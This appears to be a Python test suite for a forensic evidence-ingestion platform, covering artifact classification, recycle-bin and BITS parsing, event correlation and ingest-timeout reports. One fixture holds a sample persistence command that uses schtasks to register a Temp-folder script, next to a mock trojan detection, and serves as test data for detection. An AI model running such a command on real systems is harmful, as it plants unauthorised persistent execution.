        + "\n",
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-recycle-jsonl",
        path,
        {
            "artifact_type": "recycle_bin",
            "name": path.name,
            "source_path": str(path),
            "parser": "jsonl",
            "recycle_artifact_type": "recycle_bin_jsonl",
            "source_tool": "jsonl",
            "source_format": "jsonl",
        },
    )
    assert len(docs) == 1
    assert docs[0]["artifact"]["type"] == "recycle_bin"
    assert docs[0]["artifact"]["parser"] == "recycle_bin_jsonl"
    assert docs[0]["event"]["type"] == "file_deleted"


def test_recycle_bin_semi_auto_sections_and_correlation(monkeypatch) -> None:
    recycle_path = Path(__file__).parent / "fixtures" / "recycle_bin" / "rbcmd_sample.csv"
    recycle_docs = normalize_file(
        "case-1",
        "ev-1",
        "art-recycle",
        recycle_path,
        {
            "artifact_type": "recycle_bin",
            "name": recycle_path.name,
            "source_path": str(recycle_path),
            "parser": "rbcmd",
            "recycle_artifact_type": "recycle_bin_csv",
            "source_tool": "rbcmd",
            "source_format": "csv",
        },
    )
    browser_path = Path(__file__).parent / "fixtures" / "browser_downloads_sample.csv"
    browser_docs = normalize_file("case-1", "ev-1", "art-browser", browser_path, {"artifact_type": "browser", "name": browser_path.name, "source_path": str(browser_path), "parser": "browserhistoryview"})
    defender_event = {
        "id": "def-rec-1",
        "event_id": "def-rec-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-def",
        "@timestamp": "2026-05-10T08:10:00+00:00",
        "event": {"category": "detection", "type": "defender_detection", "severity": "high", "message": "Threat detected"},
        "detection": {"path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "threat_name": "Trojan:Win32/Test"},
        "artifact": {"type": "defender", "name": "DetectionHistory"},
        "tags": ["defender", "detection"],
        "suspicious_reasons": [],
    }
    mft_event = {
        "id": "mft-rec-1",
        "event_id": "mft-rec-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-mft",
        "@timestamp": "2026-05-10T08:05:00+00:00",
        "event": {"category": "file", "type": "file_deleted", "severity": "medium", "message": "File deleted"},
        "file": {"path": "C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "name": "invoice.pdf.exe"},
        "artifact": {"type": "mft", "name": "MFTECmd_Output.csv"},
        "tags": [],
        "suspicious_reasons": [],
    }
    ps_event = {
        "id": "ps-rec-1",
        "event_id": "ps-rec-1",
        "evidence_id": "ev-1",
        "artifact_id": "art-ps",
        "@timestamp": "2026-05-10T08:01:00+00:00",
        "event": {"category": "powershell", "type": "powershell_console_history", "severity": "medium", "message": "PowerShell console command: schtasks"},
        "powershell": {"command": "schtasks /Create /TN Update /TR C:\\Users\\alex\\AppData\\Local\\Temp\\runme.ps1", "command_preview": "schtasks /Create /TN Update /TR C:\\Users\\alex\\AppData\\Local\\Temp\\runme.ps1", "artifact_type": "psreadline_history", "source_file": "ConsoleHost_history.txt", "paths": ["C:\\Users\\alex\\AppData\\Local\\Temp\\runme.ps1"], "has_persistence": True},
        "artifact": {"type": "powershell", "name": "ConsoleHost_history.txt"},
        "process": {"name": "powershell.exe", "command_line": "schtasks /Create /TN Update /TR C:\\Users\\alex\\AppData\\Local\\Temp\\runme.ps1"},
        "tags": ["powershell", "persistence"],
        "suspicious_reasons": [],
    }
    events = [*browser_docs, *recycle_docs, defender_event, mft_event, ps_event]
    monkeypatch.setattr("app.analysis.semi_auto.iter_case_events", lambda case_id, query=None: iter(events))
    result = build_case_semi_auto_analysis("case-1")
    assert result["sections"]["recycled_files"]
    assert result["sections"]["deleted_detected_files"]
    assert result["sections"]["cleanup_candidates"]
    assert any(item["confidence"] >= 0.9 for item in result["sections"]["deleted_files"])


def test_artifact_classification_bits_csv() -> None:
    result = classify_artifact(
        Path("BITS_jobs.csv"),
        ["JobId", "DisplayName", "OwnerSID", "State", "RemoteUrl", "LocalPath", "NotifyCmdLine", "BytesTransferred"],
    )
    assert result["artifact_type"] == "bits"
    assert result["parser"] == "bits_csv"


def test_artifact_classification_bits_json() -> None:
    result = classify_artifact(
        Path("BitsParser.json"),
        ["JobGuid", "DisplayName", "Owner", "RemoteUrl", "LocalFile", "TransferCompletionTime"],
    )
    assert result["artifact_type"] == "bits"
    assert result["parser"] == "bits_json"


def test_artifact_classification_bits_jsonl() -> None:
    result = classify_artifact(
        Path("bits_jobs_sample.jsonl"),
        ["ArtifactType", "JobGuid", "DisplayName", "Owner", "RemoteUrl", "LocalPath", "TransferCompletionTime"],
    )
    assert result["artifact_type"] == "bits"
    assert result["parser"] == "bits_jsonl"


def test_artifact_classification_bits_qmgr_dat() -> None:
    result = classify_artifact(Path("qmgr0.dat"), [])
    assert result["artifact_type"] == "bits"
    assert result["parser"] == "bits_qmgr"


def test_list_generic_artifacts_includes_qmgr_raw_candidate(tmp_path: Path) -> None:
    qmgr = tmp_path / "qmgr0.dat"
    qmgr.write_text("placeholder", encoding="utf-8")
    artifacts = list_generic_artifacts(tmp_path)
    row = next(item for item in artifacts if item["name"] == "qmgr0.dat")
    assert row["artifact_type"] == "bits"
    assert row["parser"] == "bits_qmgr"


def test_list_generic_artifacts_includes_user_activity_raw_hives(tmp_path: Path) -> None:
    ntuser = tmp_path / "raw_hives" / "NTUSER.DAT"
    usrclass = tmp_path / "raw_hives" / "USRCLASS.DAT"
    ntuser.parent.mkdir(parents=True, exist_ok=True)
    ntuser.write_text("placeholder", encoding="utf-8")
    usrclass.write_text("placeholder", encoding="utf-8")
    artifacts = list_generic_artifacts(tmp_path)
    by_source = {item["source_path"]: item for item in artifacts}
    ntuser_key = str(ntuser.relative_to(tmp_path))
    usrclass_key = str(usrclass.relative_to(tmp_path))
    assert by_source[ntuser_key]["artifact_type"] == "user_activity"
    assert by_source[ntuser_key]["parser"] == "user_activity_registry_raw"
    assert by_source[usrclass_key]["artifact_type"] == "user_activity"
    assert by_source[usrclass_key]["parser"] == "user_activity_registry_raw"


def test_build_ingest_summary_keeps_parseable_counts_coherent_for_raw_collections() -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path="/tmp/sample.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={"selected_candidates": 5},
        error_log={},
    )
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence"), export_timestamp=datetime.now(UTC))
    manifests = {
        "evidence-1": {
            "stats": {
                "detected_artifacts": 375,
                "results_artifacts_detected": 0,
                "results_artifacts_parsed": 441,
                "raw_artifacts_detected": 375,
                "raw_artifacts_parsed": 441,
            }
        }
    }
    summary = _build_ingest_summary(context, manifests)
    assert summary[0]["artifacts_parsed"] == 882
    assert summary[0]["artifacts_parseable"] >= summary[0]["artifacts_detected"]


def test_build_ingest_performance_report_includes_metadata_coherence_and_evtx_indexed() -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="sample.zip",
        stored_path="/tmp/sample.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed,
        metadata_json={
            "ingest_performance": {
                "duration_seconds": 12.5,
                "records_per_sec": 80.0,
                "evtx_files_total": 2,
                "evtx_files_parsed": 2,
                "evtx_records_read": 150,
                "evtx_records_indexed": 140,
                "metadata_events_indexed": 140,
                "ignored_zip_entries": {"__MACOSX": 3, "appledouble": 2},
                "slow_artifacts": [{"artifact": "slow.evtx"}],
            },
            "last_successful_ingest_plan": {
                "plan_source": "previous_selection",
                "selected_candidates": [
                    {"artifact_type": "evtx_raw"},
                    {"artifact_type": "evtx_raw"},
                ],
            },
        },
        error_log={},
    )
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence"), export_timestamp=datetime.now(UTC))
    manifests = {
        "evidence-1": {
            "artifacts": [
                {"artifact_type": "evtx_raw", "parser": "evtx_raw", "status": "completed", "ingest_audit": {"records_read": 100, "records_indexed": 95}},
                {"artifact_type": "evtx_raw", "parser": "evtx_raw", "status": "completed", "ingest_audit": {"records_read": 50, "records_indexed": 45}},
            ]
        }
    }
    ingest_summary = [{"status": "completed", "indexed_events": 145}]
    report = _build_ingest_performance_report(context, manifests, ingest_summary)
    assert report["evtx_records_indexed"] == 140
    assert report["ignored_zip_entries"]["__MACOSX"] == 3
    assert report["metadata_coherence"]["metadata_events_indexed"] == 140
    assert report["metadata_coherence"]["opensearch_events_count"] == 145
    assert report["metadata_coherence"]["delta"] == 5


def test_build_ingest_performance_report_exposes_raw_collection_type() -> None:
    case = Case(id="case-1", name="Debug Case")
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="EVTX-ATTACK-SAMPLES.zip",
        stored_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
        original_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed_with_errors,
        source_tool="raw_collection",
        storage_mode=EvidenceStorageMode.mounted_path,
        metadata_json={
            "collection_kind": "raw_evidence_collection",
            "source_type": "raw_collection",
            "ingest_performance": {"metadata_events_indexed": 10},
        },
        error_log={},
    )
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence"), export_timestamp=datetime.now(UTC))
    report = _build_ingest_performance_report(context, {"evidence-1": {"artifacts": []}}, [{"status": "completed_with_errors", "indexed_events": 10}])

    assert report["evidence_type"] == "raw_collection"
    assert report["source_tool"] == "raw_collection"


def test_reconcile_artifact_states_on_ingest_close_marks_processing_artifact_timeout() -> None:
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    TestingSession = sessionmaker(bind=engine)
    db = TestingSession()
    try:
        case = Case(id="aaaaaaaa-1111-1111-1111-111111111111", name="Case 1", status=CaseStatus.open)
        evidence = Evidence(
            id="bbbbbbbb-2222-2222-2222-222222222222",
            case_id="aaaaaaaa-1111-1111-1111-111111111111",
            original_filename="collection.zip",
            stored_path="/tmp/collection.zip",
            evidence_type=EvidenceType.velociraptor_zip,
            sha256="00",
            size_bytes=1,
            ingest_status=IngestStatus.processing,
            metadata_json={
                "current_artifact": "CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                "parallel_ingest": {
                    "running_artifacts": [
                        {
                            "artifact": "CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                            "artifact_type": "windows_event",
                            "records_read": 13500,
                            "records_indexed": 12000,
                        }
                    ]
                },
            },
        )
        artifact = Artifact(
            id="cccccccc-3333-3333-3333-333333333333",
            case_id="aaaaaaaa-1111-1111-1111-111111111111",
            evidence_id="bbbbbbbb-2222-2222-2222-222222222222",
            name="CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
            artifact_type="windows_event",
            source_path="Windows/System32/winevt/Logs/CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
            parser="evtx_raw",
            status="processing",
            record_count=0,
        )
        db.add_all([case, evidence, artifact])
        db.commit()
        manifest = {
            "artifacts": [
                {
                    "name": "CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                    "source_path": "Windows/System32/winevt/Logs/CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                    "artifact_type": "windows_event",
                    "parser": "evtx_raw",
                    "status": "processing",
                    "ingest_audit": {},
                }
            ],
            "errors": [],
        }

        result = _reconcile_artifact_states_on_ingest_close(
            db,
            evidence=evidence,
            manifest=manifest,
            run_id="ingest-timeout",
            terminal_status="failed",
            terminal_phase="timeout",
            terminal_error="Task exceeded maximum timeout value (3600 seconds)",
            timeout_seconds=3600,
        )
        db.commit()
        db.refresh(artifact)

        assert artifact.status == "failed_timeout"
        assert artifact.record_count == 12000
        assert manifest["artifacts"][0]["status"] == "failed_timeout"
        assert manifest["artifacts"][0]["ingest_audit"]["records_read"] == 13500
        assert manifest["artifacts"][0]["ingest_audit"]["records_indexed"] == 12000
        assert result["completed_count"] == 0
        assert result["failed_count"] == 1
    finally:
        db.close()


def test_build_problematic_artifacts_report_includes_reconciled_timeout_artifact() -> None:
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="collection.zip",
        stored_path="/tmp/collection.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed_with_errors,
        metadata_json={},
        error_log={},
    )
    manifest = {
        "artifacts": [
            {
                "name": "CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                "source_path": "Windows/System32/winevt/Logs/CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                "artifact_type": "windows_event",
                "parser": "evtx_raw",
                "status": "failed_timeout",
                "ingest_audit": {"records_read": 13500, "records_indexed": 12000, "timeout_seconds": 3600},
            }
        ],
        "errors": [
            {
                "artifact": "CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                "error": "Artifact did not finish before the ingest run timed out after 3600s",
            }
        ],
    }

    report = build_problematic_artifacts_report(
        evidence,
        manifest,
        artifact_id_by_key={("Windows/System32/winevt/Logs/CA_PetiPotam_etw_rpc_efsr_5_6.evtx", "evtx_raw"): "artifact-1"},
    )

    assert report["summary"]["problematic_count"] == 1
    item = report["items"][0]
    assert item["original_status"] == "partially_parsed"
    assert item["effective_status"] == "partially_parsed"
    assert item["retryable"] is True
    assert item["suggested_retry_mode"] == "deep_safe_mode"
    assert item["current_data_loss_expected"] is True


def test_build_problematic_artifacts_report_includes_failed_aborted_artifact_rows() -> None:
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="collection.zip",
        stored_path="/tmp/collection.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed_with_errors,
        metadata_json={},
        error_log={},
    )
    artifact_row = Artifact(
        id="artifact-1",
        evidence_id="evidence-1",
        case_id="case-1",
        name="EVTX raw - Security.evtx",
        source_path="Windows/System32/winevt/Logs/Security.evtx",
        artifact_type="windows_event",
        parser="evtx_raw",
        status="failed_aborted",
        record_count=1910,
    )

    report = build_problematic_artifacts_report(
        evidence,
        {"artifacts": [], "errors": []},
        artifact_id_by_key={("Windows/System32/winevt/Logs/Security.evtx", "evtx_raw"): "artifact-1"},
        artifact_rows=[artifact_row],
    )

    assert report["summary"]["problematic_count"] == 1
    item = report["items"][0]
    assert item["artifact_id"] == "artifact-1"
    assert item["status"] == "failed_aborted"
    assert item["effective_status"] == "failed_aborted"
    assert item["retryable"] is True
    assert item["suggested_retry_mode"] == "deep_safe_mode"
    assert item["current_data_loss_expected"] is True
    assert item["error_message"] == "Artifact did not reach terminal parser completion before worker/run abort."


def test_classify_long_tail_artifact_state_marks_slow_progressing() -> None:
    result = classify_long_tail_artifact_state(
        {
            "parser": "evtx_raw",
            "source_path": "Windows/System32/winevt/Logs/Security.evtx",
            "records_read": 10000,
            "records_indexed": 8000,
            "elapsed_seconds": 1200,
            "last_progress_seconds_ago": 120,
            "status": "processing",
        },
        warning_seconds=900,
        stall_seconds=600,
        max_runtime_seconds=3600,
        defer_after_seconds=1800,
    )

    assert result["long_tail_state"] == "slow_progressing"
    assert result["importance"] == "high"
    assert result["partial_coverage_warning"] is True


def test_classify_long_tail_artifact_state_marks_stalled_no_progress() -> None:
    result = classify_long_tail_artifact_state(
        {
            "parser": "evtx_raw",
            "source_path": "Windows/System32/winevt/Logs/System.evtx",
            "records_read": 1910,
            "records_indexed": 0,
            "elapsed_seconds": 4200,
            "last_progress_seconds_ago": 901,
            "status": "processing",
        },
        warning_seconds=900,
        stall_seconds=600,
        max_runtime_seconds=3600,
        defer_after_seconds=1800,
    )

    assert result["long_tail_state"] == "stalled_no_progress"
    assert result["defer_recommended"] is True
    assert result["hard_timeout_recommended"] is True


def test_build_long_tail_artifacts_report_includes_running_and_queued_evtx() -> None:
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="collection.zip",
        stored_path="/tmp/collection.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.processing,
        metadata_json={
            "current_ingest_run_id": "ingest-run-1",
            "tail_current_artifacts": [
                {
                    "artifact": "EVTX raw - Microsoft-Windows-Sysmon%4Operational.evtx",
                    "artifact_type": "windows_event",
                    "parser": "evtx_raw",
                    "source_path": "Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%4Operational.evtx",
                    "records_read": 8000,
                    "records_indexed": 6000,
                    "elapsed_seconds": 4200,
                    "last_progress_seconds_ago": 120,
                }
            ],
            "tail_artifacts_queued": 1,
        },
        error_log={},
    )
    running_row = Artifact(
        id="artifact-running",
        evidence_id="evidence-1",
        case_id="case-1",
        name="EVTX raw - Microsoft-Windows-Sysmon%4Operational.evtx",
        source_path="Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%4Operational.evtx",
        artifact_type="windows_event",
        parser="evtx_raw",
        status="processing",
        record_count=0,
    )
    queued_row = Artifact(
        id="artifact-queued",
        evidence_id="evidence-1",
        case_id="case-1",
        name="EVTX raw - System.evtx",
        source_path="Windows/System32/winevt/Logs/System.evtx",
        artifact_type="windows_event",
        parser="evtx_raw",
        status="queued_parallel",
        record_count=0,
    )

    report = build_long_tail_artifacts_report(evidence, artifact_rows=[running_row, queued_row])

    assert report["run_id"] == "ingest-run-1"
    assert report["summary"]["tail_artifacts_total"] == 2
    assert report["summary"]["high_value_count"] == 2
    states = {item["artifact_id"]: item["long_tail_state"] for item in report["items"]}
    assert states["artifact-running"] == "slow_progressing"
    assert states["artifact-queued"] == "queued_tail"


def test_build_ingest_performance_report_prefers_current_run_metrics(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Case 1", status=CaseStatus.open)
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="EVTX-ATTACK-SAMPLES.zip",
        stored_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
        original_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed_with_errors,
        source_tool="raw_collection",
        storage_mode=EvidenceStorageMode.mounted_path,
        metadata_json={
            "latest_ingest_run_id": "ingest-current",
            "ingest_runs": [
                {
                    "run_id": "ingest-old",
                    "status": "completed_with_errors",
                    "last_error": "duplicate key value violates unique constraint \"uq_case_hosts_case_canonical_name\"",
                    "events_indexed": 5784,
                },
                {
                    "run_id": "ingest-current",
                    "status": "completed_with_errors",
                    "events_indexed": 20255,
                    "records_read": 21755,
                    "records_per_sec": 6.04,
                    "elapsed_seconds": 3599.88,
                },
            ],
            "ingest_performance": {
                "effective_parallelism": 4,
                "metadata_events_indexed": 5784,
            },
            "parallel_ingest": {
                "enabled": True,
                "mode": "threads",
                "effective_parallelism": 2,
                "artifacts_parallelized_by_type": {"windows_event": 278},
            },
            "opensearch_bulk": {"host_identity": {"upserts": 0, "conflicts_recovered": 0, "host_identity_conflict_retries": 0, "aliases_updated": 0}},
        },
        error_log={},
    )
    context = _DebugPackContext(case=case, evidences=[evidence], request=DebugExportRequest(scope="evidence"), export_timestamp=datetime.now(UTC))
    monkeypatch.setattr("app.services.debug_export.count_documents", lambda index, query=None: {"count": 20255})

    report = _build_ingest_performance_report(context, {"evidence-1": {"artifacts": []}}, [{"status": "failed", "indexed_events": 5784}])

    assert report["current_run_id"] == "ingest-current"
    assert report["effective_parallelism"] == 2
    assert report["events_indexed"] == 20255
    assert report["metadata_coherence"]["opensearch_events_count"] == 20255
    assert report["metadata_coherence"]["delta"] == 0
    assert report["historical_errors"][0]["run_id"] == "ingest-old"


def test_build_host_identity_report_separates_historical_errors(monkeypatch: pytest.MonkeyPatch) -> None:
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    TestingSession = sessionmaker(bind=engine)
    db = TestingSession()
    try:
        case = Case(id="dddddddd-4444-4444-4444-444444444444", name="Case 1", status=CaseStatus.open)
        evidence = Evidence(
            id="eeeeeeee-5555-5555-5555-555555555555",
            case_id="dddddddd-4444-4444-4444-444444444444",
            original_filename="EVTX-ATTACK-SAMPLES.zip",
            stored_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
            evidence_type=EvidenceType.velociraptor_zip,
            sha256="00",
            size_bytes=1,
            ingest_status=IngestStatus.completed_with_errors,
            metadata_json={
                "latest_ingest_run_id": "ingest-current",
                "ingest_runs": [
                    {
                        "run_id": "ingest-old",
                        "status": "completed_with_errors",
                        "last_error": "duplicate key value violates unique constraint \"uq_case_hosts_case_canonical_name\"",
                    },
                    {
                        "run_id": "ingest-current",
                        "status": "completed_with_errors",
                        "last_error": "Run timed out after 3600s. 277/278 artifacts completed. 1 artifact was marked problematic and can be retried.",
                    },
                ],
                "opensearch_bulk": {"host_identity": {"upserts": 0, "conflicts_recovered": 0, "host_identity_conflict_retries": 0, "aliases_updated": 0}},
            },
        )
        db.add_all([case, evidence])
        db.commit()
        monkeypatch.setattr("app.services.debug_export.get_case_hosts", lambda _db, _case_id: [])
        monkeypatch.setattr("app.services.debug_export.get_host_identity_audit", lambda _db, _case_id: [])
        monkeypatch.setattr("app.services.debug_export.build_case_host_candidates", lambda _db, _case_id: [])

        report = _build_host_identity_report(db, "dddddddd-4444-4444-4444-444444444444", [])

        assert report["current_run_id"] == "ingest-current"
        assert report["current_run_errors"] == ["Run timed out after 3600s. 277/278 artifacts completed. 1 artifact was marked problematic and can be retried."]
        assert report["historical_errors"][0]["run_id"] == "ingest-old"
    finally:
        db.close()


def test_problematic_artifact_status_classification() -> None:
    assert classify_problematic_artifact_status(records_read=1000, records_indexed=1000, error_type="timeout") == ("parsed_with_warning", True, False)
    assert classify_problematic_artifact_status(records_read=6000, records_indexed=5000, error_type="timeout") == ("partially_parsed", True, True)
    assert classify_problematic_artifact_status(records_read=0, records_indexed=0, error_type="timeout") == ("skipped_timeout", False, True)
    assert classify_problematic_artifact_status(records_read=500, records_indexed=0, error_type="stalled") == ("stalled", False, True)


def test_problematic_artifact_health_classification_distinguishes_loss() -> None:
    assert classify_problematic_artifact_health(status="parsed_with_warning", records_read=1000, records_indexed=1000, data_loss_expected=False) == (
        "Indexed records available",
        "No expected data loss",
    )
    assert classify_problematic_artifact_health(status="skipped_timeout", records_read=0, records_indexed=0, data_loss_expected=True) == (
        "Not parsed",
        "Data loss expected",
    )


def test_build_problematic_artifacts_report_summarizes_retryable_evtxs() -> None:
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="EVTX-ATTACK-SAMPLES.zip",
        stored_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed_with_errors,
        metadata_json={
            "artifact_retry_runs": [
                {
                    "run_id": "retry-1",
                    "items": [
                        {
                            "source_path": "Windows/System32/winevt/Logs/bits_openvpn.evtx",
                            "parser": "evtx_raw",
                            "status": "parsed_with_warning",
                        }
                    ],
                }
            ]
        },
        error_log={},
    )
    manifest = {
        "artifacts": [
            {
                "name": "bits_openvpn.evtx",
                "source_path": "Windows/System32/winevt/Logs/bits_openvpn.evtx",
                "artifact_type": "evtx_raw",
                "parser": "evtx_raw",
                "status": "completed",
                "ingest_audit": {"records_read": 1000, "records_indexed": 1000, "bulk_batches": 1, "timeout_seconds": 45},
            },
            {
                "name": "CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                "source_path": "Windows/System32/winevt/Logs/CA_PetiPotam_etw_rpc_efsr_5_6.evtx",
                "artifact_type": "evtx_raw",
                "parser": "evtx_raw",
                "status": "failed",
                "ingest_audit": {"records_read": 6000, "records_indexed": 5000, "bulk_batches": 5, "timeout_seconds": 45},
            },
        ],
        "errors": [
            {"artifact": "bits_openvpn.evtx", "error": "EVTX artifact stalled for 45s: bits_openvpn.evtx (1000 read / 1000 indexed)"},
            {"artifact": "CA_PetiPotam_etw_rpc_efsr_5_6.evtx", "error": "EVTX bulk index stalled and timed out after 45s"},
        ],
    }

    report = build_problematic_artifacts_report(
        evidence,
        manifest,
        artifact_id_by_key={
            ("Windows/System32/winevt/Logs/bits_openvpn.evtx", "evtx_raw"): "artifact-1",
            ("Windows/System32/winevt/Logs/CA_PetiPotam_etw_rpc_efsr_5_6.evtx", "evtx_raw"): "artifact-2",
        },
    )

    assert report["summary"]["problematic_count"] == 2
    assert report["summary"]["parsed_with_warning"] == 1
    assert report["summary"]["partially_parsed"] == 1
    assert report["summary"]["retryable"] == 2
    by_name = {item["name"]: item for item in report["items"]}
    assert by_name["bits_openvpn.evtx"]["status"] == "parsed_with_warning"
    assert by_name["bits_openvpn.evtx"]["data_loss_expected"] is False
    assert by_name["bits_openvpn.evtx"]["health_summary"] == "Indexed records available"
    assert by_name["bits_openvpn.evtx"]["loss_summary"] == "No expected data loss"
    assert by_name["bits_openvpn.evtx"]["records_read"] == 1000
    assert by_name["bits_openvpn.evtx"]["records_indexed"] == 1000
    assert by_name["bits_openvpn.evtx"]["retry_history"][0]["status"] == "parsed_with_warning"
    assert by_name["CA_PetiPotam_etw_rpc_efsr_5_6.evtx"]["status"] == "partially_parsed"
    assert by_name["CA_PetiPotam_etw_rpc_efsr_5_6.evtx"]["importance"] == "high"


def test_problematic_artifact_effective_status_marks_recovered_retry() -> None:
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="EVTX-ATTACK-SAMPLES.zip",
        stored_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed_with_errors,
        metadata_json={
            "artifact_retry_runs": [
                {
                    "run_id": "retry-1",
                    "items": [
                        {
                            "source_path": "Windows/System32/winevt/Logs/LM_5145_Remote_FileCopy.evtx",
                            "parser": "evtx_raw",
                            "status": "parsed_with_warning",
                            "mode": "deep_safe_mode",
                            "outcome": "recovered_more_data",
                            "records_read": 869,
                            "records_indexed": 869,
                        }
                    ],
                }
            ]
        },
        error_log={},
    )
    manifest = {
        "artifacts": [
            {
                "name": "LM_5145_Remote_FileCopy.evtx",
                "source_path": "Windows/System32/winevt/Logs/LM_5145_Remote_FileCopy.evtx",
                "artifact_type": "evtx_raw",
                "parser": "evtx_raw",
                "status": "failed",
                "ingest_audit": {"records_read": 0, "records_indexed": 0},
            }
        ],
        "errors": [{"artifact": "LM_5145_Remote_FileCopy.evtx", "error": "EVTX bulk index stalled and timed out after 45s"}],
    }

    report = build_problematic_artifacts_report(evidence, manifest, artifact_id_by_key={("Windows/System32/winevt/Logs/LM_5145_Remote_FileCopy.evtx", "evtx_raw"): "artifact-1"})

    item = report["items"][0]
    assert item["original_status"] == "skipped_timeout"
    assert item["effective_status"] == "recovered_with_warning"
    assert item["recovered"] is True
    assert item["recovered_records"] == 869
    assert item["current_data_loss_expected"] is False
    assert report["summary"]["recovered_count"] == 1
    assert report["summary"]["unresolved_count"] == 0


def test_problematic_artifact_effective_status_marks_source_missing_but_indexed() -> None:
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="EVTX-ATTACK-SAMPLES.zip",
        stored_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed_with_errors,
        metadata_json={
            "artifact_health_checks": [
                {
                    "artifact_key": "artifact-1",
                    "diagnosis": "file_missing",
                }
            ]
        },
        error_log={},
    )
    manifest = {
        "artifacts": [
            {
                "name": "bits_openvpn.evtx",
                "source_path": "Windows/System32/winevt/Logs/bits_openvpn.evtx",
                "artifact_type": "evtx_raw",
                "parser": "evtx_raw",
                "status": "failed",
                "ingest_audit": {"records_read": 1000, "records_indexed": 1000},
            }
        ],
        "errors": [{"artifact": "bits_openvpn.evtx", "error": "EVTX artifact stalled for 45s: bits_openvpn.evtx (1000 read / 1000 indexed)"}],
    }

    report = build_problematic_artifacts_report(evidence, manifest, artifact_id_by_key={("Windows/System32/winevt/Logs/bits_openvpn.evtx", "evtx_raw"): "artifact-1"})

    item = report["items"][0]
    assert item["effective_status"] == "source_missing_but_indexed"
    assert item["current_data_loss_expected"] is False
    assert report["summary"]["source_missing_but_indexed"] == 1


def test_problematic_artifact_acceptance_changes_effective_status() -> None:
    evidence = Evidence(
        id="evidence-1",
        case_id="case-1",
        original_filename="EVTX-ATTACK-SAMPLES.zip",
        stored_path="/mnt/evidence/EVTX-ATTACK-SAMPLES.zip",
        evidence_type=EvidenceType.velociraptor_zip,
        sha256="00",
        size_bytes=1,
        ingest_status=IngestStatus.completed_with_errors,
        metadata_json={
            "artifact_warning_acceptances": {
                "artifact-1": {
                    "accepted_at": "2026-05-23T11:00:00Z",
                    "accepted_reason": "Indexed data reviewed",
                }
            }
        },
        error_log={},
    )
    manifest = {
        "artifacts": [
            {
                "name": "bits_openvpn.evtx",
                "source_path": "Windows/System32/winevt/Logs/bits_openvpn.evtx",
                "artifact_type": "evtx_raw",
                "parser": "evtx_raw",
                "status": "failed",
                "ingest_audit": {"records_read": 1000, "records_indexed": 1000},
            }
        ],
        "errors": [{"artifact": "bits_openvpn.evtx", "error": "EVTX artifact stalled for 45s: bits_openvpn.evtx (1000 read / 1000 indexed)"}],
    }

    report = build_problematic_artifacts_report(evidence, manifest, artifact_id_by_key={("Windows/System32/winevt/Logs/bits_openvpn.evtx", "evtx_raw"): "artifact-1"})

    item = report["items"][0]
    assert item["accepted_warning"] is True
    assert item["effective_status"] == "accepted_warning"
